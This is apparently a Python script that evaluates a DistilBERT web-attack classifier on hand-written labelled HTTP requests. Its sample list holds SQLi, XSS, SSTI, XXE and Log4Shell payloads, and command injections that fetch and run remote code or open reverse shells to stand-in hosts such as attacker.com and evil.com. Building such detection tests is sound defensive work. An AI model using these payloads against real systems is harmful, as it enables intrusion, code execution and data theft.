#!/usr/bin/env python3
"""
Smoke-evaluate the model_v5 (10-class DistilBERT) against a hand-curated set
of full-request canonical samples.

The samples are NOT taken from any training/test split — they are written by
hand from public attack reference material (OWASP cheat sheets, CWE examples,
PortSwigger, Trivy/PayloadsAllTheThings catalogues paraphrased in distinct
shapes) plus realistic normal browsing traffic. The intent is an "unseen
distribution" sanity check, not a leaderboard run.

Output
------
1. overall accuracy
2. per-class precision / recall / F1
3. confusion matrix
4. all mis-classified samples printed with the model's top-3 scores

Usage
-----
    python scripts/eval_model_v5.py \
        --model ml-service/model_v5/extracted/model/final_model_v5 \
        [--samples scripts/eval_samples_v5.jsonl]   # optional external set

If --samples is omitted, the built-in BUILT_IN_SAMPLES list is used (~110
records). The JSONL format is one object per line: {"label": "...", "text": "..."}
where `text` is a pre-composed canonical request.
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import time
import urllib.parse
from collections import defaultdict
from typing import Dict, List, Tuple

import torch
from transformers import AutoTokenizer, AutoModelForSequenceClassification


def decode_once(s: str) -> str:
    """Mirror Go BuildCanonicalText: 1-layer percent-decode."""
    if not s or "%" not in s:
        return s
    try:
        return urllib.parse.unquote(s)
    except Exception:
        return s


# --------------------------------------------------------------------------- #
# Canonical compose helper                                                     #
# --------------------------------------------------------------------------- #
HEADER_ORDER = [
    "Host",
    "User-Agent",
    "Content-Type",
    "Referer",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Requested-With",
    "Origin",
    "Cookie",
    "Authorization",
]


def compose(
    method: str,
    path: str,
    headers: Dict[str, str] | None = None,
    body: str = "",
) -> str:
    """Build a canonical full-request string in the v5/v6 training shape.

    Mirrors Go internal/training/canonical.go: URL-decodes the path+query and
    body one layer (so URL-encoded log4shell `%24%7Bjndi...` reaches the model
    in its literal `${jndi...` form, matching v6 fine-tune distribution)."""
    headers = headers or {}
    path = decode_once(path)
    body = decode_once(body)
    lines: List[str] = [f"{method.upper()} {path}"]
    for h in HEADER_ORDER:
        v = headers.get(h) or headers.get(h.lower())
        if v:
            lines.append(f"{h}: {v}")
    out = "\n".join(lines)
    if body:
        out += "\n\n" + body
    return out


# --------------------------------------------------------------------------- #
# Built-in test set — a few representative samples per class.                  #
#                                                                              #
# Each entry: (label, method, path, headers, body)                             #
# --------------------------------------------------------------------------- #
UA_CHROME = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
UA_FIREFOX = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:127.0) Gecko/20100101 Firefox/127.0"
UA_CURL = "curl/8.4.0"

RAW: List[Tuple[str, str, str, Dict[str, str], str]] = [
    # ----- NORMAL (15) -----
    ("normal", "GET", "/", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("normal", "GET", "/products?category=shoes&page=2", {"Host": "shop.example.com", "User-Agent": UA_CHROME, "Referer": "https://shop.example.com/"}, ""),
    ("normal", "GET", "/articles/2026/05/ai-trends?utm_source=twitter", {"Host": "blog.example.com", "User-Agent": UA_FIREFOX}, ""),
    ("normal", "POST", "/api/v1/login", {"Host": "app.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"email":"alice@example.com","password":"***REDACTED***"}'),
    ("normal", "POST", "/api/v1/checkout", {"Host": "shop.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"cart_id":"c-72918","shipping":"standard","coupon":"SPRING10"}'),
    ("normal", "GET", "/search?q=running+shoes+size+10", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("normal", "GET", "/static/js/app.bundle.min.js", {"Host": "cdn.example.com", "User-Agent": UA_CHROME}, ""),
    ("normal", "GET", "/health", {"Host": "internal.example.com", "User-Agent": UA_CURL}, ""),
    ("normal", "PUT", "/api/users/941/profile", {"Host": "app.example.com", "User-Agent": UA_FIREFOX, "Content-Type": "application/json"}, '{"display_name":"Nguyen Anh","bio":"Backend engineer in HCMC"}'),
    ("normal", "GET", "/docs/getting-started/installation.html", {"Host": "docs.example.com", "User-Agent": UA_CHROME, "Referer": "https://www.google.com/"}, ""),
    ("normal", "GET", "/api/v2/orders?status=shipped&from=2026-04-01&to=2026-05-01", {"Host": "api.example.com", "User-Agent": UA_CURL, "Authorization": "Bearer"}, ""),
    ("normal", "POST", "/contact", {"Host": "www.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/x-www-form-urlencoded"}, "name=John+Doe&email=jdoe%40example.com&subject=Question+about+pricing&message=Hi+team%2C+I+would+like+to+know+about+enterprise+plans."),
    # Hard-negatives — strings that *look* attacky in URLs / search.
    ("normal", "GET", "/search?q=how+to+use+SELECT+in+SQL+tutorial", {"Host": "stackoverflow.example.com", "User-Agent": UA_CHROME}, ""),
    ("normal", "GET", "/blog/cross-site-scripting-101", {"Host": "blog.example.com", "User-Agent": UA_FIREFOX}, ""),
    ("normal", "GET", "/wiki/Bash_(Unix_shell)", {"Host": "wiki.example.com", "User-Agent": UA_CHROME}, ""),

    # ----- SQLI (10) -----
    ("sqli", "GET", "/products?id=1' OR '1'='1", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("sqli", "GET", "/items?id=1 UNION SELECT username,password FROM users--", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("sqli", "POST", "/login", {"Host": "app.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/x-www-form-urlencoded"}, "username=admin'--&password=anything"),
    ("sqli", "GET", "/api/products?id=1; DROP TABLE products;--", {"Host": "api.example.com", "User-Agent": UA_CURL}, ""),
    ("sqli", "GET", "/cat?id=1 AND SLEEP(5)--", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("sqli", "POST", "/api/search", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"q":"foo\\" UNION SELECT NULL,version()--"}'),
    ("sqli", "GET", "/news?id=2' AND extractvalue(1,concat(0x7e,(SELECT version())))--", {"Host": "news.example.com", "User-Agent": UA_CHROME}, ""),
    ("sqli", "GET", "/p?id=10) OR 1=1--", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("sqli", "POST", "/api/v1/comment", {"Host": "api.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"comment":"nice","id":"1\' OR \'1\'=\'1"}'),
    ("sqli", "GET", "/q?id=1' WAITFOR DELAY '0:0:5'--", {"Host": "mssql.example.com", "User-Agent": UA_CHROME}, ""),

    # ----- XSS (10) -----
    ("xss", "GET", "/search?q=<script>alert(1)</script>", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("xss", "GET", "/p?name=<img src=x onerror=alert(document.cookie)>", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("xss", "POST", "/comment", {"Host": "blog.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/x-www-form-urlencoded"}, 'body=%3Csvg+onload%3Dalert(1)%3E'),
    ("xss", "GET", "/q?x=javascript:alert(1)", {"Host": "app.example.com", "User-Agent": UA_CHROME}, ""),
    ("xss", "POST", "/api/profile", {"Host": "api.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"bio":"<iframe src=\\"javascript:alert(1)\\"></iframe>"}'),
    ("xss", "GET", "/p?msg=\"><script>fetch('//evil.com/?c='+document.cookie)</script>", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("xss", "GET", "/feedback?text=<body onload=alert('xss')>", {"Host": "blog.example.com", "User-Agent": UA_CHROME}, ""),
    ("xss", "POST", "/wiki/edit", {"Host": "wiki.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/x-www-form-urlencoded"}, "title=Foo&content=%3Cscript%3Ewindow.location%3D%27//evil.com%27%3C%2Fscript%3E"),
    ("xss", "GET", "/render?html=<a href=\"javascript:void(alert(1))\">click</a>", {"Host": "app.example.com", "User-Agent": UA_CHROME}, ""),
    ("xss", "GET", "/search?q=<details/open/ontoggle=confirm('xss')>", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),

    # ----- CMDI (10) -----
    ("cmdi", "GET", "/ping?host=8.8.8.8;cat /etc/passwd", {"Host": "tools.example.com", "User-Agent": UA_CHROME}, ""),
    ("cmdi", "GET", "/tools?cmd=ls|nc evil.com 4444", {"Host": "admin.example.com", "User-Agent": UA_CURL}, ""),
    ("cmdi", "POST", "/api/exec", {"Host": "internal.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"input":"$(curl http://attacker.com/sh.sh|sh)"}'),
    ("cmdi", "GET", "/diag?ip=127.0.0.1`whoami`", {"Host": "ops.example.com", "User-Agent": UA_CURL}, ""),
    ("cmdi", "GET", "/run?x=foo && wget http://evil.com/x.elf -O /tmp/x && chmod +x /tmp/x && /tmp/x", {"Host": "ops.example.com", "User-Agent": UA_CURL}, ""),
    ("cmdi", "POST", "/api/v1/render", {"Host": "api.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"path":";id;"}'),
    ("cmdi", "GET", "/dns?h=$(nslookup attacker.com)", {"Host": "tools.example.com", "User-Agent": UA_CURL}, ""),
    ("cmdi", "POST", "/api/v1/system", {"Host": "internal.example.com", "User-Agent": UA_CURL, "Content-Type": "application/x-www-form-urlencoded"}, "cmd=uname+-a%3B+cat+%2Fetc%2Fshadow"),
    ("cmdi", "GET", "/cgi-bin/test.cgi?action=ping&target=8.8.8.8||id", {"Host": "router.example.com", "User-Agent": UA_CURL}, ""),
    ("cmdi", "GET", "/img?file=`reboot`", {"Host": "tools.example.com", "User-Agent": UA_CURL}, ""),

    # ----- PATH_TRAVERSAL (10) -----
    ("path_traversal", "GET", "/static?file=../../../../etc/passwd", {"Host": "cdn.example.com", "User-Agent": UA_CHROME}, ""),
    ("path_traversal", "GET", "/download?path=..%2F..%2F..%2Fetc%2Fshadow", {"Host": "files.example.com", "User-Agent": UA_CURL}, ""),
    ("path_traversal", "GET", "/img?p=....//....//....//etc/passwd", {"Host": "cdn.example.com", "User-Agent": UA_CHROME}, ""),
    ("path_traversal", "GET", "/view?doc=..%252F..%252Fwindows%252Fwin.ini", {"Host": "app.example.com", "User-Agent": UA_CHROME}, ""),
    ("path_traversal", "GET", "/file?name=/var/log/../../etc/passwd", {"Host": "ops.example.com", "User-Agent": UA_CURL}, ""),
    ("path_traversal", "GET", "/asset?path=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", {"Host": "cdn.example.com", "User-Agent": UA_CHROME}, ""),
    ("path_traversal", "POST", "/api/read", {"Host": "api.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"file":"../../../../../../etc/passwd"}'),
    ("path_traversal", "GET", "/get?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", {"Host": "files.example.com", "User-Agent": UA_CURL}, ""),
    ("path_traversal", "GET", "/include?page=../../../../proc/self/environ", {"Host": "app.example.com", "User-Agent": UA_CHROME}, ""),
    ("path_traversal", "GET", "/serve?f=..%c0%af..%c0%afetc/passwd", {"Host": "cdn.example.com", "User-Agent": UA_CHROME}, ""),

    # ----- SSRF (10) -----
    ("ssrf", "GET", "/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", {"Host": "tools.example.com", "User-Agent": UA_CHROME}, ""),
    ("ssrf", "POST", "/api/fetch", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"url":"http://127.0.0.1:6379/"}'),
    ("ssrf", "GET", "/preview?u=http://localhost:8080/admin", {"Host": "tools.example.com", "User-Agent": UA_CHROME}, ""),
    ("ssrf", "GET", "/img?src=gopher://127.0.0.1:6379/_FLUSHALL", {"Host": "img.example.com", "User-Agent": UA_CURL}, ""),
    ("ssrf", "POST", "/webhook/test", {"Host": "api.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"target":"http://[::ffff:127.0.0.1]/secret"}'),
    ("ssrf", "GET", "/load?u=file:///etc/passwd", {"Host": "tools.example.com", "User-Agent": UA_CHROME}, ""),
    ("ssrf", "GET", "/r?url=http://metadata.google.internal/computeMetadata/v1/instance/", {"Host": "tools.example.com", "User-Agent": UA_CURL}, ""),
    ("ssrf", "GET", "/p?u=dict://127.0.0.1:11211/stats", {"Host": "tools.example.com", "User-Agent": UA_CURL}, ""),
    ("ssrf", "POST", "/api/v2/render", {"Host": "api.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"src":"http://0177.0.0.1/admin"}'),  # octal localhost
    ("ssrf", "GET", "/fetch?url=http://2130706433/", {"Host": "tools.example.com", "User-Agent": UA_CURL}, ""),  # 127.0.0.1 as int

    # ----- XXE (8) -----
    ("xxe", "POST", "/api/import", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/xml"}, '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
    ("xxe", "POST", "/svc/parse", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "text/xml"}, '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil.com/x.dtd">%p;]><r/>'),
    ("xxe", "POST", "/api/upload.xml", {"Host": "files.example.com", "User-Agent": UA_CURL, "Content-Type": "application/xml"}, '<!DOCTYPE root [<!ELEMENT root ANY><!ENTITY ext SYSTEM "http://attacker.com/exfil">]><root>&ext;</root>'),
    ("xxe", "POST", "/soap", {"Host": "soap.example.com", "User-Agent": UA_CURL, "Content-Type": "application/soap+xml"}, '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a SYSTEM "file:///c:/windows/win.ini">]><x>&a;</x>'),
    ("xxe", "POST", "/api/v1/xml", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/xml"}, '<?xml version="1.0"?><!DOCTYPE d [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY exfil SYSTEM \'http://x.com/?d=%file;\'>">%eval;%exfil;]><d/>'),
    ("xxe", "POST", "/feed", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/xml"}, '<!DOCTYPE replace [<!ENTITY ent SYSTEM "expect://id">]><user>&ent;</user>'),
    ("xxe", "POST", "/parse", {"Host": "doc.example.com", "User-Agent": UA_CURL, "Content-Type": "application/xml"}, '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><x>&xxe;</x>'),
    ("xxe", "POST", "/svc", {"Host": "soap.example.com", "User-Agent": UA_CURL, "Content-Type": "text/xml"}, '<!DOCTYPE t [<!ENTITY % e SYSTEM "http://evil/xxe.dtd"> %e;]><t/>'),

    # ----- LOG4SHELL (8) -----
    ("log4shell", "GET", "/", {"Host": "app.example.com", "User-Agent": "${jndi:ldap://attacker.com/a}"}, ""),
    ("log4shell", "GET", "/health", {"Host": "ops.example.com", "User-Agent": UA_CURL, "X-Forwarded-For": "${jndi:rmi://evil/a}"}, ""),
    ("log4shell", "POST", "/api/log", {"Host": "log.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"q":"${jndi:dns://attacker.com/test}"}'),
    ("log4shell", "GET", "/search?q=${jndi:ldap://${env:HOSTNAME}.evil.com/a}", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("log4shell", "GET", "/", {"Host": "app.example.com", "User-Agent": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://x.com/a}"}, ""),
    ("log4shell", "GET", "/api/v1/data", {"Host": "api.example.com", "User-Agent": UA_CURL, "Referer": "${jndi:ldap://${sys:java.version}.evil/a}"}, ""),
    ("log4shell", "POST", "/feedback", {"Host": "www.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/x-www-form-urlencoded"}, "msg=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D"),
    ("log4shell", "GET", "/", {"Host": "app.example.com", "User-Agent": UA_CHROME, "X-Api-Version": "${jndi:ldap://x.com/}", "X-Forwarded-For": "127.0.0.1"}, ""),

    # ----- SSTI (8) -----
    ("ssti", "GET", "/render?tpl={{7*7}}", {"Host": "app.example.com", "User-Agent": UA_CHROME}, ""),
    ("ssti", "GET", "/p?name={{config.items()}}", {"Host": "app.example.com", "User-Agent": UA_CHROME}, ""),
    ("ssti", "POST", "/api/render", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"tpl":"{{\'\'.__class__.__mro__[1].__subclasses__()}}"}'),
    ("ssti", "GET", "/hello?name=${7*7}", {"Host": "tpl.example.com", "User-Agent": UA_CHROME}, ""),
    ("ssti", "GET", "/p?x=<%= 7*7 %>", {"Host": "tpl.example.com", "User-Agent": UA_CHROME}, ""),
    ("ssti", "POST", "/preview", {"Host": "app.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/x-www-form-urlencoded"}, 'tpl=%7B%25+import+os+%25%7D%7B%7B+os.popen(%27id%27).read()+%7D%7D'),
    ("ssti", "GET", "/render?t=#{7*7}", {"Host": "tpl.example.com", "User-Agent": UA_CHROME}, ""),
    ("ssti", "POST", "/api/v1/template", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"t":"{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}"}'),

    # ----- NOSQLI (8) -----
    ("nosqli", "POST", "/login", {"Host": "app.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"username":{"$ne":null},"password":{"$ne":null}}'),
    ("nosqli", "GET", "/api/users?username[$regex]=^admin", {"Host": "api.example.com", "User-Agent": UA_CHROME}, ""),
    ("nosqli", "POST", "/api/search", {"Host": "api.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"$where":"function(){return this.password.length>0}"}'),
    ("nosqli", "GET", "/find?u[$gt]=", {"Host": "api.example.com", "User-Agent": UA_CURL}, ""),
    ("nosqli", "POST", "/api/auth", {"Host": "api.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"user":"admin","pwd":{"$gt":""}}'),
    ("nosqli", "POST", "/api/v1/query", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"filter":{"$where":"sleep(2000)"}}'),
    ("nosqli", "POST", "/login", {"Host": "app.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"username":"admin","password":{"$regex":".*"}}'),
    ("nosqli", "POST", "/api/lookup", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"id":{"$ne":-1},"$comment":"bypass"}'),

    # ====================================================================== #
    # EXTENDED v6 test set — direct hits on v5's known weaknesses              #
    # ====================================================================== #

    # ----- NORMAL hard-negatives (search queries with suspicious keywords) (15) -----
    # These ALL bombed under v5 (false-positive XSS). v6 should classify normal.
    ("normal", "GET", "/search?q=sql+injection+tutorial+for+beginners", {"Host": "blog.example.com", "User-Agent": UA_CHROME}, ""),
    ("normal", "GET", "/search?q=how+to+prevent+cross+site+scripting", {"Host": "owasp.example.com", "User-Agent": UA_FIREFOX}, ""),
    ("normal", "GET", "/articles?keyword=eval+function+in+javascript", {"Host": "dev.example.com", "User-Agent": UA_CHROME}, ""),
    ("normal", "GET", "/q?term=DROP+TABLE+syntax+postgres", {"Host": "docs.example.com", "User-Agent": UA_CHROME}, ""),
    ("normal", "GET", "/search?q=bash+shell+scripting+guide", {"Host": "wiki.example.com", "User-Agent": UA_FIREFOX}, ""),
    ("normal", "POST", "/api/search", {"Host": "api.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"q":"how to read /etc/passwd file linux"}'),
    ("normal", "GET", "/articles?title=Log4j+CVE-2021-44228+explained", {"Host": "blog.example.com", "User-Agent": UA_CHROME}, ""),
    ("normal", "GET", "/search?q=python+os+system+command", {"Host": "stackoverflow.example.com", "User-Agent": UA_CHROME, "Referer": "https://www.google.com/"}, ""),
    ("normal", "GET", "/topic/server-side-request-forgery", {"Host": "wiki.example.com", "User-Agent": UA_FIREFOX}, ""),
    ("normal", "GET", "/search?q=jinja2+template+inheritance", {"Host": "docs.example.com", "User-Agent": UA_CHROME}, ""),
    ("normal", "GET", "/blog/posts?category=security&tag=xxe", {"Host": "blog.example.com", "User-Agent": UA_CHROME}, ""),
    ("normal", "GET", "/products?q=ssh+tunnel+software", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("normal", "GET", "/docs?topic=mongodb+regex+query+examples", {"Host": "docs.example.com", "User-Agent": UA_CHROME}, ""),
    ("normal", "GET", "/", {"Host": "shop.example.com", "User-Agent": UA_CHROME, "Referer": "https://www.google.com/search?q=eval+vs+exec+python"}, ""),
    ("normal", "POST", "/contact", {"Host": "www.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/x-www-form-urlencoded"}, "name=Alice&email=alice%40example.com&subject=Question+about+SELECT+statement&message=Hi%2C+I+have+a+question+about+the+SELECT+syntax+in+your+tutorial."),

    # ----- CMDi: pipe / backtick / $() / URL-encoded / Windows (15) -----
    # v5 cmdi recall = 40 %. v6 should hit ≥ 0.85 F1.
    ("cmdi", "GET", "/diag?host=8.8.8.8|nc evil.com 4444", {"Host": "ops.example.com", "User-Agent": UA_CURL}, ""),
    ("cmdi", "POST", "/api/check", {"Host": "ops.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"target":"127.0.0.1|nc -e /bin/sh attacker.com 9999"}'),
    ("cmdi", "GET", "/run?cmd=`id`", {"Host": "tools.example.com", "User-Agent": UA_CURL}, ""),
    ("cmdi", "GET", "/exec?c=`cat /etc/shadow`", {"Host": "ops.example.com", "User-Agent": UA_CURL}, ""),
    ("cmdi", "POST", "/api/util", {"Host": "internal.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"x":"$(whoami)"}'),
    ("cmdi", "POST", "/api/v2/sysinfo", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"input":"$(curl http://attacker.com/sh.sh|bash)"}'),
    # URL-encoded variants — v6 with decode_once should catch these.
    ("cmdi", "GET", "/ping?h=8.8.8.8%3Bid", {"Host": "ops.example.com", "User-Agent": UA_CURL}, ""),
    ("cmdi", "GET", "/exec?cmd=%24%28cat+%2Fetc%2Fpasswd%29", {"Host": "ops.example.com", "User-Agent": UA_CURL}, ""),
    ("cmdi", "POST", "/run", {"Host": "ops.example.com", "User-Agent": UA_CURL, "Content-Type": "application/x-www-form-urlencoded"}, "input=%60whoami%60"),
    ("cmdi", "GET", "/check?ip=127.0.0.1%26%26reboot", {"Host": "router.example.com", "User-Agent": UA_CURL}, ""),
    # Windows variants
    ("cmdi", "GET", "/diag?h=localhost & dir C:\\", {"Host": "iis.example.com", "User-Agent": UA_CURL}, ""),
    ("cmdi", "GET", "/run?cmd=test & type C:\\Windows\\System32\\drivers\\etc\\hosts", {"Host": "iis.example.com", "User-Agent": UA_CURL}, ""),
    ("cmdi", "POST", "/api/ps", {"Host": "iis.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"cmd":"echo test && powershell -c \\"Get-Process\\""}'),
    # Reverse shell
    ("cmdi", "POST", "/api/shell", {"Host": "internal.example.com", "User-Agent": UA_CURL, "Content-Type": "application/x-www-form-urlencoded"}, "cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2Fattacker.com%2F4444+0%3E%261"),
    ("cmdi", "GET", "/tools?op=ls;wget http://attacker.com/x.elf -O /tmp/x;chmod +x /tmp/x;/tmp/x", {"Host": "tools.example.com", "User-Agent": UA_CURL}, ""),

    # ----- LOG4SHELL URL-encoded + header injection (10) -----
    # v5 missed URL-encoded body + clean-UA header injection.
    ("log4shell", "POST", "/feedback", {"Host": "www.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/x-www-form-urlencoded"}, "msg=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D"),
    ("log4shell", "GET", "/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fx.com%2Fa%7D", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("log4shell", "POST", "/api/log", {"Host": "log.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"input":"%24%7Bjndi%3Aldap%3A%2F%2Fx%2Fa%7D"}'),
    # Header injection with bland everything else
    ("log4shell", "GET", "/", {"Host": "app.example.com", "User-Agent": UA_CHROME, "Referer": "${jndi:ldap://evil/a}"}, ""),
    ("log4shell", "GET", "/api/data", {"Host": "api.example.com", "User-Agent": UA_CHROME, "X-Forwarded-For": "${jndi:rmi://evil/a}"}, ""),
    ("log4shell", "GET", "/health", {"Host": "ops.example.com", "User-Agent": UA_CHROME, "X-Real-IP": "${jndi:dns://x/}"}, ""),
    ("log4shell", "GET", "/", {"Host": "app.example.com", "User-Agent": UA_CHROME, "Origin": "${jndi:ldap://attacker.com/a}"}, ""),
    # Obfuscation
    ("log4shell", "GET", "/", {"Host": "app.example.com", "User-Agent": "${${env:NaN:-j}ndi:ldap://evil.com/a}"}, ""),
    ("log4shell", "GET", "/api/v1/probe", {"Host": "api.example.com", "User-Agent": "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://x.com/}"}, ""),
    ("log4shell", "POST", "/api/v1/log", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"q":"${jndi:ldap://${env:HOSTNAME}.attacker.com/a}"}'),

    # ----- SQLi no-quote stacked queries (8) -----
    # v5 failed `id=1; DROP TABLE products;--` with confidence 1.00 normal.
    ("sqli", "GET", "/products?id=1; DROP TABLE users", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("sqli", "GET", "/users?id=1; DELETE FROM logs", {"Host": "app.example.com", "User-Agent": UA_CURL}, ""),
    ("sqli", "GET", "/items?pid=42; UPDATE users SET role='admin' WHERE id=1", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("sqli", "GET", "/news?id=2 UNION SELECT password FROM users", {"Host": "news.example.com", "User-Agent": UA_CHROME}, ""),
    ("sqli", "GET", "/p?id=1 AND SLEEP(5)", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("sqli", "GET", "/news?id=2 UNION ALL SELECT NULL,version(),NULL", {"Host": "news.example.com", "User-Agent": UA_CHROME}, ""),
    # Hex-encoded
    ("sqli", "GET", "/users?id=0x31204f522031%3d31--", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("sqli", "POST", "/api/v2/query", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"id":"1; INSERT INTO logs(msg) VALUES (\'pwn\')"}'),

    # ----- XSS additional variants (7) -----
    ("xss", "GET", "/?q=<svg/onload=alert(/xss/)>", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("xss", "GET", "/p?html=%3Cscript%3Ealert(1)%3C/script%3E", {"Host": "app.example.com", "User-Agent": UA_CHROME}, ""),
    ("xss", "POST", "/api/post", {"Host": "api.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"body":"<img src=x onerror=\\"fetch(\'//evil/?c=\'+document.cookie)\\">"}'),
    ("xss", "GET", "/comment?text=<a href=\"javascript:eval(atob('YWxlcnQoMSk='))\">click</a>", {"Host": "blog.example.com", "User-Agent": UA_CHROME}, ""),
    ("xss", "GET", "/p?x=javascript%3Aalert%281%29", {"Host": "app.example.com", "User-Agent": UA_CHROME}, ""),
    ("xss", "GET", "/?q=<input autofocus onfocus=alert(1)>", {"Host": "shop.example.com", "User-Agent": UA_CHROME}, ""),
    ("xss", "GET", "/render?html=<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>", {"Host": "render.example.com", "User-Agent": UA_CHROME}, ""),

    # ----- SSRF additional cloud-metadata + edge (5) -----
    ("ssrf", "GET", "/fetch?url=http://[::1]:6379/", {"Host": "tools.example.com", "User-Agent": UA_CURL}, ""),
    ("ssrf", "POST", "/api/import", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"url":"http://169.254.169.254/latest/api/token"}'),
    ("ssrf", "GET", "/fetch?u=http://localhost.attacker.com/", {"Host": "tools.example.com", "User-Agent": UA_CURL}, ""),  # DNS rebinding
    ("ssrf", "GET", "/proxy?u=http%3A%2F%2F127.0.0.1%3A22%2F", {"Host": "tools.example.com", "User-Agent": UA_CURL}, ""),  # URL-encoded
    ("ssrf", "POST", "/api/v2/fetch", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"source":"ldap://127.0.0.1:389/dc=admin"}'),

    # ----- PATH_TRAVERSAL additional (5) -----
    ("path_traversal", "GET", "/static?file=..%252f..%252f..%252fetc%252fpasswd", {"Host": "cdn.example.com", "User-Agent": UA_CHROME}, ""),  # double-encoded — should NOT decode to literal traversal at 1 layer
    ("path_traversal", "GET", "/asset?p=/etc/passwd%00.png", {"Host": "cdn.example.com", "User-Agent": UA_CHROME}, ""),  # null-byte
    ("path_traversal", "POST", "/api/render", {"Host": "api.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"file":"../../../proc/self/maps"}'),
    ("path_traversal", "GET", "/include?f=../../../var/log/auth.log", {"Host": "ops.example.com", "User-Agent": UA_CURL}, ""),
    ("path_traversal", "GET", "/d?path=..%2f..%2f..%2fboot.ini", {"Host": "cdn.example.com", "User-Agent": UA_CHROME}, ""),

    # ----- XXE additional (4) -----
